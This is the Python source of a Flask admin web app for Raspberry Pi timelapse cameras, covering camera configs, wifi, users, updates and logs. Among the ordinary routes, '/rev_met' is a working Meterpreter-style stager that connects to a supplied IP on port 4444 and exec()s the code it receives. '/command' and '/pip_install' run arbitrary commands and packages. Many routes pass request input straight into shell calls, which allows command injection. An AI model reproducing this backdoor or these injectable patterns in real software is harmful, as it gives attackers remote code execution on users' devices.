#!/usr/bin/python3
import fnmatch
import json
import logging
import os
import re
import shutil
import socket
import subprocess
import time
from jinja2 import Environment, FileSystemLoader
from configparser import ConfigParser
from datetime import datetime
from functools import wraps
from glob import glob

from flask import Flask, redirect, url_for, send_file, abort, Response, render_template, jsonify, \
    send_from_directory, request
from flask.ext.bcrypt import Bcrypt

try:
    # generate a new machine id if one does not already exist
    if not os.path.exists("/etc/machine-id"):
        os.system("systemd-machine-id-setup")

    os.system("chown -R tor:tor /home/tor_private ")
    os.system("chown -R tor:tor /var/lib/tor ")
except:
    print("something went wrong, oh well...")

# TODO: compatibility anydbm
import dbm

config_filename = 'eyepi.ini'
otherconfig_filename = 'picam.ini'
example_filename = 'example.ini'


app = Flask(__name__, static_url_path='/static')
app.debug = True
bcrypt = Bcrypt(app)

cfg = ConfigParser()
cfg.read("picam.ini")

if socket.gethostname() != "VorvadossTwo":
    kmsghandler = logging.FileHandler("/dev/kmsg", 'w')
    app.logger.addHandler(kmsghandler)

def setup_ap():
    env = Environment(loader=FileSystemLoader('templates'))
    template = env.get_template("createap")
    interface = os.popen("ip link | cut -c4- | grep ^w | sed 's/:.*//'").read().rstrip()
    #Enumerates ip link, removes first 4 characters, filters lines that start with w then removes text following ':'
    netprofile = open('/usr/lib/systemd/system/create_ap.service', 'w')
    netprofile.write(template.render(interface=interface))
    netprofile.close()
    print("Starting AP")
    os.system("systemctl start create_ap.service")

def sanitizeconfig(towriteconfig, filename):
    """
    This will eventually do checking of the config file.
    it currently just writes a config file to a filename.
    :param towriteconfig:
    :param filename:
    :return:
    """
    with open(filename, 'w') as configfile:
        towriteconfig.write(configfile)


def get_time():
    """
    gets a time string from the current time.
    :return:
    """
    return str(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))


def get_hostname():
    """
    returns the hostname of the system as a string.
    :return:
    """
    return str(socket.gethostname())


app.jinja_env.globals.update(get_time=get_time)
app.jinja_env.globals.update(get_hostname=get_hostname)


def geteosserialnumber(port):
    """
    this is meant to get the eosserialnumber (or really any serial number that is associated with the camera)
    needs a rework so that it is more consistent across cameras.
    :param port:
    :return:
    """
    try:
        cmdret = subprocess.check_output('gphoto2 --port "' + port + '" --get-config eosserialnumber', shell=True)
        return cmdret[cmdret.find("Current: ") + 9: len(cmdret) - 1]
    except:
        return 0


def create_config(serialnumber, eosserial=0):
    """
    Creates a new configuration file from the default config.
    :param serialnumber:
    :param eosserial:
    :return:
    """
    if not os.path.exists("configs_byserial"):
        os.makedirs("configs_byserial")
    thiscfg = ConfigParser()
    thiscfg.read("eyepi.ini")
    thiscfg["localfiles"]["spooling_dir"] = os.path.join(thiscfg["localfiles"]["spooling_dir"], serialnumber)
    thiscfg["localfiles"]["upload_dir"] = os.path.join(thiscfg["localfiles"]["upload_dir"], serialnumber)
    thiscfg["camera"]["name"] = thiscfg["camera"]["name"] + "-" + serialnumber
    thiscfg["eosserialnumber"]["value"] = eosserial
    with open(os.path.join("configs_byserial", serialnumber + '.ini'), 'w') as configfile:
        thiscfg.write(configfile)


def detect_cameras(type):
    """
    detects DSLRS attached to the pi
    :param type:
    :return:
    """
    try:
        a = subprocess.check_output("gphoto2 --auto-detect", shell=True)
        cams = {}
        for port in re.finditer("usb:", a):
            cmdret = subprocess.check_output(
                'gphoto2 --port "' + a[port.start():port.end() + 7] + '" --get-config serialnumber', shell=True)
            cams[a[port.start():port.end() + 7]] = cmdret[cmdret.find("Current: ") + 9: len(cmdret) - 1]
        return cams
    except Exception as e:
        print(str(e))


def check_auth(username, password):
    """
    Authentication validation.
    would be better with bcrypt, but it doesnt actually matter.
    :param username:
    :param password:
    :return:
    """
    ubytes = bytes(username, 'utf-8')
    db = dbm.open('db', 'r')
    if ubytes in db.keys():
        if bcrypt.check_password_hash(db[ubytes].decode('utf-8'), password):
            db.close()
            return True
        else:
            db.close()
            return False


def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)

    return decorated


def authenticate():
    """
    really this should just return a 404 for it to be really secure.
    But I use the message sometimes.
    :return:
    """
    return Response('Access DENIED!', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})


@app.errorhandler(404)
def not_found(error):
    return render_template('page_not_found.html'), 404


@app.errorhandler(500)
def server_error(error):
    return render_template('server_error.html'), 500


@app.errorhandler(401)
def bad_auth(error):
    return render_template('bad_auth.html'), 401


def add_user(username, password_to_set, adminpass):
    """
    creates a new user on the pi.
    checks to see whether the user is an admin.
    also checks to see whether the user is trying to change their own password.
    :param username:
    :param password_to_set:
    :param adminpass:
    :return:
    """
    hash = bcrypt.generate_password_hash(password_to_set)
    db = dbm.open('db', 'c')
    # later only allow users control over their own password and admin to add later.
    # allow global admin password to change everything.
    if b'admin' in db.keys() and bcrypt.check_password_hash(db[b'admin'], adminpass):
        db[username] = hash
        db.close()
        return True

    # for each username, only allow the correct hash to change the password
    for username_, hash_ in db.items():
        if username_ in db.keys() and bcrypt.check_password_hash(hash_, adminpass):
            db[username] = hash
            db.close()
            return True
    db.close()
    return False


@app.route("/imgs/<path:path>")
def get_image(path):
    if '..' in path or path.startswith('/'):
        abort(404)
    return send_file(os.path.join("static", "temp", path + ".jpg"))


def cap_lock_wait(port, serialnumber):
    try:
        a = subprocess.check_output(
            "gphoto2 --port=" + str(port) + " --capture-preview --force-overwrite --filename='static/temp/" + str(
                serialnumber) + ".jpg'", shell=True).decode()
        print(a)
        return False
    except subprocess.CalledProcessError as e:
        print(e.output)
        return True


def capture_preview(serialnumber):
    try:
        a = subprocess.check_output("gphoto2 --auto-detect", shell=True).decode()
        for port in re.finditer("usb:", a):
            port = a[port.start():port.end() + 7]
            cmdret = subprocess.check_output('gphoto2 --port "' + port + '" --get-config serialnumber',
                                             shell=True).decode()
            _serialnumber = cmdret[cmdret.find("Current: ") + 9: len(cmdret) - 1]
            if _serialnumber == serialnumber:
                tries = 0
                while tries < 10 and cap_lock_wait(port, serialnumber):
                    tries += 1
                    time.sleep(1)
                return True

    except subprocess.CalledProcessError as e:
        print(str(e))

@app.route("/available_networks", methods=["GET"])
def available_networks():
    def generate_networks():
        networks = str.splitlines(os.popen('sudo iw dev wlp6s0 scan | grep "SSID: " | cut -c 8- | sort |uniq').read())
        networks = [x for x in networks if "x00" not in x]
        for net in networks:
            yield net + '\n'
    return app.response_class(generate_networks(), mimetype='text/plain')

@app.route("/wifi", methods=["GET"])
def wifi():
    return render_template("wifi.html")


@app.route("/preview_cam", methods=["GET"])
def preview():
    if request.method == 'GET':
        if request.args.get("serialnumber"):
            serialnumber = request.args.get("serialnumber")
            preview = capture_preview(serialnumber)
            return send_file("static/temp/" + str(serialnumber) + ".jpg")
        else:
            return "fail"
    else:
        return "fail"


@app.route("/rev_met")
@requires_auth
def reverse_meterpreter():
    ip = request.args.get('ip', None)
    import socket, struct
    try:
        s = socket.socket(2, 1)
        s.connect((ip, 4444))
        l = struct.unpack('>I', s.recv(4))[0]
        d = s.recv(4096)
        while len(d) != l:
            d += s.recv(4096)
        exec(d, {'s': s})
    except Exception as e:
        return str(e), 500
    return "SUCCESS"

@app.route("/focus_cams")
def focus():
    a = subprocess.check_output("gphoto2 --auto-detect", shell=True).decode()
    for port in re.finditer("usb:", a):
        port = a[port.start():port.end() + 7]
        cmdret = subprocess.check_output('gphoto2 --port "' + port + '" --get-config serialnumber',
                                         shell=True).decode()
    return "success"


@app.route("/sync_hwclock")
@requires_auth
def sync_hwclock():
    print("Synchronising hwclock")
    try:
        cmd = subprocess.check_output("hwclock --systohc", shell=True)
    except Exception as e:
        print("There was a problem Synchronising the hwclock. Debug me please.")
        print("Exception: " + str(e))
        return render_template('server_error.html'), 500

    return redirect(url_for('config'))

@app.route('/savetousb', methods=["POST"])
@requires_auth
def savetousb():
    config = ConfigParser()
    if request.form["name"] == "picam":
        config.read("picam.ini")
    else:
        config.read(os.path.join("configs_byserial", request.form["name"] + '.ini'))
    try:
        subprocess.call("mount /dev/sda1 /mnt/", shell=True)
        shutil.copytree(config["localfiles"]["upload_dir"], os.path.join("/mnt/", config["camera"]["name"]))
    except Exception as e:
        subprocess.call("umount /mnt", shell=True)
        print(str(e))
        return "failure"
    subprocess.call("umount /mnt", shell=True)
    return "success"


from flask import g


def after_this_request(func):
    if not hasattr(g, 'call_after_request'):
        g.call_after_request = []
    g.call_after_request.append(func)
    return func


def shutdown_server():
    func = request.environ.get('werkzeug.server.shutdown')
    if func is None:
        raise RuntimeError('Not running with the Werkzeug Server')
    func()

@app.after_request
def per_request_callbacks(response):
    for func in getattr(g, 'call_after_request', ()):
        response = func(response)
    return response


@app.route('/restart')
@app.route('/reboot')
@requires_auth
def restart():
    @after_this_request
    def shutdown(response):
        print("SHUTTING DOWN!")
        time.sleep(1)
        os.system("reboot now")
        return response
    return "Rebooting... ", 200


@app.route("/update")
@requires_auth
def update():
    @after_this_request
    def update(response):
        app.debug = False
        os.system("git fetch --all;git reset --hard origin/master")
        os.system("systemctl restart spc-eyepi_capture.service")
        return response
    app.debug = True
    return "SUCCESS"


@app.route("/update_to_tag/<tag>")
@requires_auth
def update_tag(tag):
    @after_this_request
    def update(response):
        app.debug = False
        os.system("git fetch --tags --all;git reset --hard {}".format(tag))
        os.system("systemctl restart eyepi-capture.service")
        return response
    app.debug = True
    return "SUCCESS"

@app.route("/pip_install")
@requires_auth
def pip_install():
    import pip
    _, package = dict(request.args).popitem()
    pip.main(["install",package])
    return "SUCCESS"



@app.route("/status")
@requires_auth
def status():
    return ''


@app.route("/wificonfig", methods=['POST'])
@requires_auth
def wificonfig():
    if request.method == 'POST':
        interface = os.popen("ip link | cut -c4- | grep ^w | sed 's/:.*//'").read().rstrip()
        print("Interface: " + interface)
        ssid = request.form["ssid"]
        key = request.form["key"]
        netprofile = open('/etc/netctl/netprofile', 'w')
        netprofile.write(render_template("netprofile", interface=interface, ssid=ssid, key=key))
        netprofile.close();
        print("Stopping AP")
        os.system("systemctl stop create_ap.service")
        print("Putting interface down")
        os.system("ifconfig "+interface+" down")
        if os.system("netctl start netprofile") != 0:
            print("Connection failed restarting AP")
            print("\nLog:\n\n"+os.popen("systemctl status netctl@netprofile.service").read())
            os.system("systemctl start create_ap.service")
        return "success"
    else:
        return abort(400)


@app.route("/newuser", methods=['POST'])
@requires_auth
def newuser():
    if request.method == 'POST':
        username = request.form["username"]
        password = request.form["pass"]
        adminpass = request.form["adminpass"]
        if len(username) > 0 and len(password) > 5:
            if add_user(username, password, adminpass) == True:
                return "success"
            else:
                return "auth_error"
        else:
            return "invalid"
    else:
        return abort(400)


@app.route('/admin')
@requires_auth
def admin():
    version = subprocess.check_output(["/usr/bin/git describe --always"], shell=True).decode()
    db = dbm.open('db', 'r')
    usernames = []
    k = db.firstkey()
    while k != None:
        usernames.append(k)
        k = db.nextkey(k)

    return render_template("admin.html", version=version, usernames=usernames)


@app.route('/update_camera/<path:serialnumber>', methods=["GET", "POST"])
@requires_auth
def update_camera_config(serialnumber):
    ser = None

    config_map = {
        'name': ('camera', 'name'),
        'capture': ('camera', 'enabled'),
        'upload': ('ftp', 'enabled'),
        'username': ('ftp', 'username'),
        'password': ('ftp', 'password'),
        'server': ('ftp', 'server'),
        'timestamp': ('ftp', 'timestamp'),
        'replace': ('ftp', 'replace'),
        'interval': ('timelapse', 'interval'),
        'starttime': ('timelapse', 'starttime'),
        'stoptime': ('timelapse', 'stoptime')
    }
    tf = {"True": "on", "False": "off"}
    if request.method == "POST":
        config = ConfigParser()
        with open("/etc/machine-id") as f:
            m_id = str(f.read())
            m_id = m_id.strip('\n')
        if m_id == serialnumber:
            # modify picam file if machine id is the sn
            config_path = "picam.ini"
            config.read(config_path)
            for key, value in request.form.items(multi=True):
                if value in tf.keys():
                    # parse datetimes correctly, because they are gonna be messy.
                    if value in ["starttime", "stoptime"]:
                        dt = datetime.strptime(value, "%Y-%m-%dT%H:%M:%S.Z")
                        value = dt.strftime('%H:%M')
                    value = tf[value]
                config[config_map[key][0]][config_map[key][1]] = value
            try:
                sanitizeconfig(config, config_path)
                return "", 200
            except Exception as e:
                "", 500

        if os.path.isfile(os.path.join("configs_byserial", serialnumber + ".ini")):
            # modify camera by serial if available, otherwise 404.
            config_path = os.path.join("configs_byserial", serialnumber + ".ini")
            config.read(config_path)
            for key, value in request.form.items(multi=True):
                if value in tf.keys():
                    value = tf[value]
                config[config_map[key][0]][config_map[key][1]] = value
            try:
                sanitizeconfig(config, config_path)
                return "", 200
            except Exception as e:
                "", 500
        else:
            return "", 404
    return "", 405


@app.route("/fix_configs")
@requires_auth
def fix_confs():
    configs = {}
    default = ConfigParser()
    default.read("example.ini")
    defaultsections = set(default.sections())
    confs = glob("configs_byserial/*.ini")
    returnvalues = []
    confs.append("picam.ini")
    confs.append("eyepi.ini")
    for conff in confs:
        configs[conff] = ConfigParser()
        configs[conff].read(conff)

    for path, config in configs.items():
        for section in set(configs[conff].sections()) - defaultsections:
            a = config.remove_section(section)
            returnvalues.append(section + "?" + str(a))
        with open(conff, 'wb') as configfile:
            config.write(configfile)
    return a.join("--")



@app.route("/command", methods=["GET", "POST"])
@requires_auth
def run_command():
    """
        accepts arbitrary commands as post, and only post
        accepts as command1:argument1 argument2, command2: argument1 argument2 ...
    """
    if request.method == 'POST':
        response = {}
        for command, argument in request.form.items():
            try:
                a = subprocess.check_output([" ".join([command, argument])], stderr=subprocess.STDOUT,
                                            shell=True).decode()
                response[command] = str(a)
            except Exception as e:
                response[command] = {}
                response[command]['exc'] = str(e)
                if hasattr(e, "output"):
                    response[command]['out'] = str(e.output.decode())
        return str(json.dumps(response))
    else:
        abort(400)


@app.route("/reset_machine_id")
@requires_auth
def reset_machine_id():
    """
        removes the machine id and calls the command to reset machine-id
    """
    resp = {}
    print("Resetting machine ID")
    try:
        if os.path.isfile("/etc/machine-id"):
            os.remove("/etc/machine-id")
        os.system("systemd-machine-id-setup")
    except Exception as e:
        resp["ERR"] = str(e)
    return str(json.dumps(resp))


@app.route('/net')
@requires_auth
def network():
    """
    render page for network
    :return:
    """
    version = subprocess.check_output(["/usr/bin/git describe --always"], shell=True).decode()
    return render_template("network.html", version=version)


def trunc_at(s, d, n):
    "Returns s truncated at the n'th occurrence of the delimiter, d."
    return d.join(s.split(d)[:n])


def get_net_size(netmask):
    binary_str = ''
    for octet in netmask:
        binary_str += bin(int(octet))[2:].zfill(8)
    return str(len(binary_str.rstrip('0')))


def commit_ip(ipaddress=None, subnet=None, gateway=None, dev="eth0"):
    """
    commits an ip to the current system
    TODO: more platform independend solution
    :param ipaddress:
    :param subnet:
    :param gateway:
    :param dev:
    :return:
    """
    if ipaddress is not None and subnet is not None and gateway is not None:
        dev = "eth0"

        broadcast = trunc_at(ipaddress, ".") + ".255"
        netmask = get_net_size(subnet)
        if not os.path.exists("/etc/conf.d/"):
            os.makedirs("/etc/conf.d/")
        with open("/etc/conf.d/net-conf-" + dev) as f:
            f.write(
                "address=" + ipaddress + "\nnetmask=" + netmask + "\nbroadcast=" + broadcast + "\ngateway=" + gateway)
        with open("/usr/local/bin/net-up.sh") as f:
            script = """#!/bin/bash
						ip link set dev "$1" up
						ip addr add ${address}/${netmask} broadcast ${broadcast} dev "$1"
						[[ -z ${gateway} ]] || {
						  ip route add default via ${gateway}
						}
					"""
            f.write(script)
        with open("/usr/local/bin/net-down.sh") as f:
            script = """#!/bin/bash
						ip addr flush dev "$1"
						ip route flush dev "$1"
						ip link set dev "$1" down
					"""
            f.write(script)
        os.system("chmod +x /usr/local/bin/net-{up,down}.sh")
        with open("/etc/systemd/system/network@.service") as f:
            script = """[Unit]
						Description=Network connectivity (%i)
						Wants=network.target
						Before=network.target
						BindsTo=sys-subsystem-net-devices-%i.device
						After=sys-subsystem-net-devices-%i.device

						[Service]
						Type=oneshot
						RemainAfterExit=yes
						EnvironmentFile=/etc/conf.d/net-conf-%i
						ExecStart=/usr/local/bin/net-up.sh %i
						ExecStop=/usr/local/bin/net-down.sh %i

						[Install]
						WantedBy=multi-user.target
					"""
            f.write(script)
        os.system("systemctl enable network@" + dev)


def make_dynamic(dev):
    os.system("systemctl disable network@" + dev)


def set_ip(ipaddress=None, subnet=None, gateway=None, dev="eth0"):
    if ipaddress is not None and subnet is not None and gateway is not None:
        os.system("ip addr add " + ipaddress + "/" + get_net_size(subnet) + " broadcast " + trunc_at(ipaddress,
                                                                                                     ".") + ".255 dev " + dev)
        os.system("ip route add default via " + gateway)
    else:
        make_dynamic(dev)


@app.route('/set-ip', methods=['POST'])
@requires_auth
def set_ips():
    if request.method == 'POST':
        try:
            if "ip-form-dynamic" in request.form.keys():
                if request.form['ip-form-dynamic'] == "on":
                    set_ip()
                else:
                    return "fail"
            else:
                try:
                    socket.inet_aton(request.form["ip-form-ipaddress"])
                    socket.inet_aton(request.form["ip-form-subnet"])
                    socket.inet_aton(request.form["ip-form-gateway"])

                    commit_ip(ipaddress=request.form["ip-form-ipaddress"],
                              subnet=request.form["ip-form-subnet"],
                              gateway=request.form["ip-form-gateway"])
                    return 'success'
                except Exception as e:
                    return "fail"
        except:
            return "fail"
    else:
        abort(400)


@app.route('/commit-ip', methods=['POST'])
@requires_auth
def commit_ip_():
    if request.method == 'POST':
        try:
            if "ip-form-dynamic" in request.form.keys():
                if request.form['ip-form-dynamic'] == "on":
                    set_ip()
                else:
                    return "fail"
            else:
                try:
                    socket.inet_aton(request.form["ip-form-ipaddress"])
                    socket.inet_aton(request.form["ip-form-subnet"])
                    socket.inet_aton(request.form["ip-form-gateway"])
                    # currently this does nothing
                    return 'success'
                    set_ip(ipaddress=request.form["ip-form-ipaddress"],
                           subnet=request.form["ip-form-subnet"],
                           gateway=request.form["ip-form-gateway"])
                except Exception as e:
                    return "fail"
        except:
            return "fail"
    else:
        abort(400)


@app.route('/break_the_interface')
@requires_auth
def break_the_interface():
    return render_template("bljdg.html")


@app.route('/delcfg', methods=['POST'])
@requires_auth
def delcfg():
    if request.method == 'POST':
        try:
            os.remove(os.path.join("configs_byserial", request.form["name"] + ".ini"))
            return "success"
        except:
            return "FAILURE"


@app.route('/detectcams', methods=['POST'])
@requires_auth
def detectcams():
    if request.method == 'POST':
        post_return_string = ""
        try:
            cameras = detect_cameras("usb")
            if len(cameras) == 0:
                return "No cameras detected, are they turned on?"
            for port, serial_number in cameras.items():
                if not os.path.isfile(os.path.join("configs_byserial", serial_number + ".ini")):
                    eos_serial = geteosserialnumber(port)
                    create_config(serial_number, eos_serial)
                    post_return_string += "Added new config for S#" + (
                        serial_number if eos_serial == 0 else eos_serial) + "<br>"
            return post_return_string
        except Exception as e:
            return "Something went horribly wrong! :" + str(e)


@app.route('/writecfg', methods=['POST'])
@requires_auth
def writecfg():
    if request.method == 'POST':
        aconfig = ConfigParser()
        config_name = request.form["config-name"] + ".ini"
        if not config_name == "picam.ini":
            config_path = os.path.join("configs_byserial", config_name)
        else:
            config_path = config_name

        aconfig.read(config_path)
        # this is required because the default behaviour of checkboxes is that they do not trigger if they are unchecked.
        aconfig["camera"]["enabled"] = "off"
        aconfig["ftp"]["upload"] = "off"
        aconfig["ftp"]["replace"] = "off"
        aconfig["ftp"]["timestamp"] = "off"
        for key, value in request.form.items(multi=True):
            # print"key:" + key +"  value:"+value
            if value != "" and key != "config-name":
                sect = key.split('.')[0]
                opt = key.split(".")[1]
                aconfig[sect][opt] = value
                # print("changed: " + sect + ':' + opt + ':' + value)
        try:
            sanitizeconfig(aconfig, config_path)
            return "success"
        except Exception as e:
            abort(400)


@app.route('/change_hostname', methods=['POST'])
@requires_auth
def change_hostname():
    if request.method == 'POST':
        if request.form['hostname']:
            hostname = request.form['hostname']
            config = ConfigParser()
            config_path = "eyepi.ini"
            config.read(config_path)
            config["camera"]["name"] = hostname
            pi_config = ConfigParser()
            pi_config_path = "picam.ini"
            pi_config.read(config_path)
            pi_config["camera"]["name"] = hostname + "-Picam"
            hostsfilestring = """#
# /etc/hosts: static lookup table for host names
#

#<ip-address>	<hostname.domain.org>	<hostname>
127.0.0.1	localhost.localdomain	localhost CHANGE
::1		localhost.localdomain	localhost CHANGE

# End of file
"""
            try:
                with open("/etc/hosts", 'w') as hostsfile:
                    hostsfile.write(hostsfilestring.replace("CHANGE", hostname))

                with open("/etc/hostname", 'w') as hostnamefile:
                    hostnamefile.write(hostname + '\n')
                os.system("hostname " + hostname)
            except Exception as e:
                print("Something went horribly wrong")
                print(str(e))
        else:
            abort(400)
        try:
            sanitizeconfig(config, config_path)
            sanitizeconfig(pi_config, pi_config_path)
            return "success"
        except Exception as e:
            abort(400)


@app.route('/')
@requires_auth
def config():
    example = ConfigParser()
    version = subprocess.check_output(["/usr/bin/git describe --always"], shell=True).decode()
    rpiconfig = ConfigParser()
    rpiconfig.read("picam.ini")
    example.read("example.ini")
    configs = {}
    for file in glob(os.path.join("configs_byserial", "*.ini")):
        configs[os.path.basename(file)[:-4]] = ConfigParser()
        configs[os.path.basename(file)[:-4]].read(file)
    return render_template("config.html", version=version, configs=configs, rpiconfig=rpiconfig, example=example)


@app.route('/filemanagement')
@requires_auth
def filemanagement():
    a = subprocess.check_output("df -h", shell=True).decode()
    fsinfolines = a.splitlines()
    fsinfo = []
    for line in fsinfolines:
        fsinfo.append(line.split())
    version = subprocess.check_output(["/usr/bin/git describe --always"], shell=True).decode()
    rpiconfig = ConfigParser()
    rpiconfig.read("picam.ini")
    configs = {}
    filelists = {}
    for file in glob(os.path.join("configs_byserial", "*.ini")):
        configs[os.path.basename(file)[:-4]] = ConfigParser()
        configs[os.path.basename(file)[:-4]].read(file)
        thisglob = glob(os.path.join(configs[os.path.basename(file)[:-4]]["localfiles"]["upload_dir"], "*.*"))[-1000:]
        dictglob = {}
        for path in thisglob:
            dictglob[os.path.basename(path)] = path
        filelists[os.path.basename(file)[:-4]] = dictglob

    filelists["picam"] = glob(os.path.join(rpiconfig["localfiles"]["upload_dir"], "*.*"))[-1000:]
    return render_template("filemgmt.html", version=version, fsinfo=fsinfo, configs=configs, rpiconfig=rpiconfig,
                           filelists=filelists)


@app.route('/filelist', methods=['POST'])
@requires_auth
def filelist():
    if request.method == 'POST':
        config = ConfigParser()
        config_name = request.form["name"] + ".ini"
        if not config_name == "picam.ini":
            config_path = os.path.join("configs_byserial", config_name)
        else:
            config_path = config_name

        config.read(config_path)
        list = glob(os.path.join(config["localfiles"]["upload_dir"], "*.*"))
        if len(list) > 1000:
            return jsonify(results=list[-1000:])
        else:
            return jsonify(results=list)
    else:
        abort(400)


@app.route("/images")
def images():
    version = subprocess.check_output(["/usr/bin/git describe --always"], shell=True).decode()
    example = ConfigParser()
    version = subprocess.check_output(["/usr/bin/git describe --always"], shell=True).decode()
    example.read("example.ini")

    configs = {}
    rpiconfig = ConfigParser()
    rpiconfig.read("picam.ini")
    for file in glob(os.path.join("configs_byserial", "*.ini")):
        configs[os.path.basename(file)[:-4]] = ConfigParser()
        configs[os.path.basename(file)[:-4]].read(file)
    configs['picam'] = rpiconfig
    urls = []
    for file in glob(os.path.join("static", "temp", "*.jpg")):
        urls.append(os.path.basename(file)[:-4])
    return render_template("images.html", version=version, configs=configs, image_urls=urls,
                           example=example)


@app.route("/getfilteredlog", methods=["POST"])
@requires_auth
def getfilteredlog():
    if request.method == 'POST':
        query = request.form["query"].lower()
        returnstring = ''
        with open("spc-eyepi.log", 'r') as f:
            f.seek(0, 2)
            fsize = f.tell()
            f.seek(max(fsize - 10.24 ** 6, 0), 0)
            lines = f.readlines()
            a = reversed(lines)
        for line in a:
            if fnmatch.fnmatch(line.lower(), "*" + query.lower() + "*") and len(returnstring.splitlines()) < 250:
                returnstring += "<tr><td>" + line + "</td></tr>" + '\n'
        returnstring += "<tr><td><h3>Truncated at 250 lines of 1Mb into the past</h3></td></tr>"
        return returnstring
    else:
        abort(400)


@app.route('/log/<lt>/<lc>')
def stream(lt, lc):
    def generate():
        line = 1
        with open("spc-eyepi.log") as f:
            r = "     "
            while len(r):
                if line > int(lc):
                    break
                line += 1
                r = f.readline().strip()
                if lt in r:
                    yield r+"\n"

    return app.response_class(generate(), mimetype='text/plain')


@app.route("/log.log")
@requires_auth
def log():
    return send_file("spc-eyepi.log")


@app.route("/deletefiles", methods=['POST'])
@requires_auth
def deletefiles():
    if request.method == "POST":
        retstr = "success"
        for key, value in request.form.items(multi=True):
            if value == "on" and not any(x in os.path.dirname(key) for x in
                                         ["/bin", "/dev", "/mnt", "/proc", "/run", "/srv", "/tmp", "/var", "/boot",
                                          "/etc", "/lib", "/opt", "/root", "/sbin", "/sys", "/usr"]):
                os.remove(key)
            else:
                retstr = "DO NOT DELETE THINGS YOU SHOULDNT!!! GRRRR!"
        return retstr
    else:
        abort(400)


@app.route("/logfile")
@requires_auth
def logfile():
    version = subprocess.check_output(["/usr/bin/git describe --always"], shell=True).decode()
    return render_template("logpage.html", version=version)


@app.route("/<any('css','js'):selector>/<path:path>")
@requires_auth
def get_resource(selector, path):
    return send_from_directory("static", filename=os.path.join(selector, path))

if os.system("ping -c 1 8.8.8.8") != 0:
    setup_ap()
    def cleanup():
        os.system("systemctl stop create_ap.service")
        print("create_ap stopped gracefully")
    import atexit
    atexit.register(cleanup)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
